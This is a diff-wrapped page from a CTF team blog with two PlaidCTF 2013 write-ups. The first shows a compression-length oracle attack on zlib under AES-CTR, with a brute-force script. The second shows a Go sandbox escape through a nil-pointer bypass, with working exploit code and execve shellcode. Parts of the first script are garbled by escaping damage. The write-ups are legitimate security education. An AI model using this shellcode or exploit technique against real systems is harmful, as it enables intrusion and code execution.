+ENCRYPT_KEY = '0000000000000000000000000000000000000000000000000000000000000000'.decode('hex')
+# Determine this key.
+# Character set: lowercase letters and underscore
+PROBLEM_KEY = 'XXXXXXXXXXXXXXXXXXXX'
+
+def encrypt(data, ctr):
+    aes = AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr)
+    return aes.encrypt(zlib.compress(data))
+
+class ProblemHandler(SocketServer.StreamRequestHandler):
+    def handle(self):
+        nonce = os.urandom(8)
+        self.wfile.write(nonce)
+        ctr = Counter.new(64, prefix=nonce)
+        while True:
+            data = self.rfile.read(4)
+            if not data:
+                break
+
+            try:
+                length = struct.unpack('I', data)[0]
+                if length &amp;gt; (1&amp;lt; CTR非常依赖Counter的唯一性。这是因为，如果你重用一个Counter，那么对两个密文分组的异或就将是相应的明文分组的异或。
+</code></pre>
+
+<p>由于zlib压缩第一个字节的明文也能猜到，于是考虑加密上是否有漏洞，但检查后方发现使用没有问题。</p>
+
+<p>后经@zhugejw老师提醒此题名为compression开始重点关注zlib，看了lz77算法发现长度大于3Byte的重复串会被压缩，结合CTR流密码可以知道zlib压缩后的数据长度,找到解题方向：跟加密无关，通过构造数据根据返回的长度，猜解PROBLEM_KEY。如果发送的串与KEY有3位以上相同就会被压缩，于是先写了个脚本爆破4位，然后按位猜解。</p>
+
+<pre><code>import socket,struct
+
+skt=socket.socket()
+skt.connect(("54.234.224.216",4433))
+nonce= skt.recv(8)
+print repr(nonce)
+
+fi = open('pyj.txt', 'a')
+
+data = list("ABCDEFGHIJKLMNOPQRST")
+
+for f1 in 'abcdefghijklmnopqrstuvwxyz_':
+    for f2 in 'abcdefghijklmnopqrstuvwxyz_':
+        for f3 in 'abcdefghijklmnopqrstuvwxyz_':
+            for f4 in 'abcdefghijklmnopqrstuvwxyz_':
+                try:
+                    data[0] = f1[0]
+                    data[1] = f2[0]
+                    data[2] = f3[0]
+                    data[3] = f4[0]
+                    sd=''.join(data)
+                    print sd
+
+                    skt.send(struct.pack('I',len(sd)))
+                    skt.send(sd)
+
+                    ciphertextlen= struct.unpack('I',skt.recv(4))[0]
+                    ciphertext = skt.recv(ciphertextlen)
+                    if ciphertextlen &amp;gt;fi, ciphertextlen, repr(ciphertext)
+                        fi.flush()
+                except:
+                    print 'except'
+                    skt.close()
+                    skt.connect(("54.234.224.216",4433))
+skt.close()
+fi.close()
+</code></pre>
+
+<p>测试时发现即使不发送数据返回的长度也比20个Byte全不同的KEY小，于是可以判断KEY中本身就有重复</p>
+
+<p>暴力跑出了</p>
+
+<blockquote><p>ime ays cri e_s <em>so met me</em><br/>
+等串</p></blockquote>
+
+<p>以此为基准按位猜解跑出 crimes_pays ，但由于key本身含有重复，会影响按位猜解，于是卡住了，最终由@Slipper大神人肉猜解出KEY：<br/>
+<code>crime_sometimes_pays</code></p>
+
+<p>ps:其实对于lz77还是不太明白，个人理解4Byte的数据压缩为3Byte才会导致长度减小，爆破时不知道为什么有3Byte重复就长度减小了，请大牛们指点</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/plaidctf-2013-bunyans_revenge-writeup/">PlaidCTF 2013 Bunyans_revenge Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-28T00:00:00+08:00" pubdate data-updated="true">Apr 28<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>Overview</h2>
+
+<p>The task is to get a shell on a sandboxed Go <a href="http://50.17.64.205:8080/">site</a>, with help of a <a href="http://play.plaidctf.com/files/go.patch-ec4d1d0cd43f70526b2864d8ccae2e3db63fd7cc"> patch </a>.Snippet below shows main part of the patch:</p>
+
+<pre>diff -r a7414a294dcb src/cmd/6g/cgen.c
+--- a/src/cmd/6g/cgen.c Fri Apr 19 12:00:40 2013 -0700
++++ b/src/cmd/6g/cgen.c Fri Apr 19 21:03:47 2013 +0000
+@@ -888,18 +888,18 @@
+    
+    case ODOTPTR:
+        cgen(nl, res);
++       // explicit check for nil if struct is large enough
++       // that we might derive too big a pointer.
++       if(nl-&gt;type-&gt;type-&gt;width &gt;= unmappedzero) {
++           regalloc(&n1, types[tptr], res);
++           gmove(res, &n1);
++           n1.op = OINDREG;
++           n1.type = types[TUINT8];
++           n1.xoffset = 0;
++           gins(ATESTB, nodintconst(0), &n1);
++           regfree(&n1);
++       }
+        if(n-&gt;xoffset != 0) {
+-           // explicit check for nil if struct is large enough
+-           // that we might derive too big a pointer.
+-           if(nl-&gt;type-&gt;type-&gt;width &gt;= unmappedzero) {
+-               regalloc(&n1, types[tptr], res);
+-               gmove(res, &n1);
+-               n1.op = OINDREG;
+-               n1.type = types[TUINT8];
+-               n1.xoffset = 0;
+-               gins(ATESTB, nodintconst(0), &n1);
+-               regfree(&n1);
+-           }
+            ginscon(optoas(OADD, types[tptr]), n-&gt;xoffset, res);
+        }
+        break;
+</pre>
+
+
+<p>It seems that he try to enforce the check related to nil, big struct, and pointer. This tell us that before patching we should be able to derive &#8220;too big a pointer&#8221; with help of nil and a large struct.</p>
+
+<h2>Unsafe pointer</h2>
+
+<p>After some reading of the source code, we knew more about which type of code related to the patch.</p>
+
+<pre>// src/cmd/gc/go.h, 478L
+    ODOT,   // t.x
+    ODOTPTR,    // p.x that is implicitly (*p).x
+    ODOTMETH,   // t.Method
+
+// src/cmd/6g/gsubr.c, 37L
+// TODO(rsc): Can make this bigger if we move
+// the text segment up higher in 6l for all GOOS.
+vlong unmappedzero = 4096;
+</pre>
+
+
+<p>And we wrote snippets of code, which does fall in the old check, or bypass it (explicitly call the pointer)</p>
+
+<pre>type T struct {
+    offset [4096]byte
+    x int
+}
+
+// fail:( 
+var t *T
+x := &(t.x)
+*x = 0
+// ** panic msg while running **
+panic: runtime error: invalid memory address or nil pointer dereference
+[signal 0xb code=0x1 addr=0x0 pc=0x400c19]
+
+// pass:)
+var t *T
+x := &((*t).x)
+*x = 0
+// ** panic msg while running **
+unexpected fault address 0x1000
+throw: fault
+[signal 0xb code=0x1 addr=0x1000 pc=0x400c1c]
+</pre>
+
+
+<h2>Changing code flow</h2>
+
+<p>The sandbox doesn&#8217;t allow us to import packages containing unsafe parts, which make the compiler not compile in any unsafe runtime code, so we need to prepare the shellcode ourselves. Soon we found that function type in Go, like function pointer in C may help us. Due to NX bits, we need to put shellcode in executable areas. Using const string seems to be a good idea. Finally we worked out a piece of code running flawless in the local environment:</p>
+
+<pre>package main
+    
+type T struct {
+// magic numbers are from objdump:(
+    offset [0x4283f8]byte
+    x int64
+}
+
+type Func func(string)
+var f Func
+
+// execve('/bin/sh', ['/bin/sh'], NULL)
+const shellcode = "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08" +
+"\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
+
+func main() {
+    var t *T
+    x := &((*t).x)
+    *x = 0x417c5c
+    // avoiding unused const optimized out, not a real argument
+    f(shellcode)
+}
+</pre>
+
+
+<p>However it didn&#8217;t work on the site. First the memory layout seems not to be like that in our local environment, but we could pass it by fixing the offset in struct(we can &#8220;read&#8221; it from .text section online). Though calling shellcode fails still.</p>
+
+<p>We noticed that panic message from the site differs from ours, which contains a file named &#8220;panic.c&#8221; not existing in our source code. It seems that they were using a different branch of Go. After searching we found this <a href="https://github.com/jnwhiteh/golang">repo</a> seems to fit theirs code well.</p>
+
+<pre>goroutine 1 [running]:
+[fp=0x7f8bbd3bbf60] runtime.throw(0x4420d7)
+    /home/bunyansrevenge/go/src/pkg/runtime/panic.c:473 +0x67
+[fp=0x7f8bbd3bbf78] runtime.sigpanic()
+    /home/bunyansrevenge/go/src/pkg/runtime/os_linux.c:239 +0xe7
+[fp=0x7f8bbd3bbf90] main.main()
+    /tmp/go-sandbox728098232/prog.go:18 +0x20
+</pre>
+
+
+<p>Comparing binary compiled by these 2 branches, we saw the difference on handling function calling: modern ones just jump to the address stored in the memory, but the other storing the address in another location, and storing that address in the memory. See the disassembly for details:</p>
+
+<pre># modern ones
+400c37:       48 8b 1c 25 f8 83 42    mov    0x4283f8,%rbx
+400c3e:       00 
+400c3f:       ff d3                   callq  *%rbx
+
+# the other
+400c3d:       48 8b 14 25 10 41 44    mov    0x444110,%rdx
+400c44:       00 
+400c45:       48 8b 1a                mov    (%rdx),%rbx
+400c48:       ff d3                   callq  *%rbx
+</pre>
+
+
+<p>So we need to change the code fitting compiler running on the site. At last it works. The complete piece of code for capturing the flag goes below:</p>
+
+<pre>package main
+    
+type T struct {
+    offset [0x444110]byte
+    x *int64
+}
+
+type Func func(string)
+var f Func
+    
+// execve('/usr/bin/cat', ['/usr/bin/cat', 'flag'], NULL)
+const shellcode = "\x48\x31\xd2\x48\xc7\xc1\x66\x6c\x61\x67\x51\x48\x89\xe1" +
+"\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x63\x61\x74\x53\x48\x89\xe7\x48\x31\xc0\x50" +
+"\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
+    
+    
+func main() {
+    var _x int64
+    _x = 0x42f5b0
+    var t *T
+    x := &((*t).x)
+    *x = &_x
+    // avoiding unused const optimized out, not a real argument
+    f(shellcode)
+}
+</pre>
+
+
+<p>The flag is <strong>nx&#95;was&#95;a&#95;good&#95;idea&#95;after&#95;all</strong>.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/blog/page/5/">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/blog/page/3/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
